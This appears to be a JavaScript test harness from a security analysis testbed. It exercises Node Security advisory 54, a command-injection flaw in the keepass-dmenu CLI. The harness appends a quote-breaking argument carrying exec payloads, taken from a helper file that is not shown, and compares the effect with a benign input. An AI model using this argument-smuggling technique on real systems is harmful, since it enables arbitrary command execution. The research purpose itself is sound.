/**
 * Advisory 54: https://nodesecurity.io/advisories/54
 */
var utils = require("iflow");
var attackUtils = require("./AttackUtils.js");
attackUtils.setup();

var configs = require("./configs.json");
var policy = require("./Policy.js")(__dirname, null);

process.argv.push("--database");
process.argv.push("./dirty.js");
process.argv.push("--nb");
process.argv.push("black");

process.on('uncaughtException', function (err) {
    //console.log(err);
})

attackUtils.deliverPayloads(attackUtils.payloadsExec, function (payload) {
    if (configs.sources.intf === true) {
        payload = utils.source(payload, utils.HIGH_LEVEL, "module-interface");
    }
    process.argv.pop();
    process.argv.push("black\" " + payload);

    try {
        require("./node_modules/keepass-dmenu/bin/keepass-dmenu-cli.js")
    } catch(e) {}
    delete require.cache[require.resolve("./node_modules/keepass-dmenu/bin/keepass-dmenu-cli.js")]
    delete require.cache[require.resolve("./node_modules/keepass-dmenu/node_modules/yargs")]
}, function(result, filesWithSinks) {
    var benignInput = "benignColor";
    if (configs.sources.intf === true) {
        benignInput = utils.source(benignInput, utils.HIGH_LEVEL, "module-interface");
    }
    process.argv.pop();
    process.argv.push(benignInput);
    try {
        require("./node_modules/keepass-dmenu/bin/keepass-dmenu-cli.js");
    } catch(e){}
    setTimeout(function() {
        process.argv.pop();
        process.argv.pop();
        process.argv.pop();
        process.argv.pop();
        attackUtils.printCallStrings();
        result += " " + attackUtils.observedString(benignInput);
    }, 1000);
});
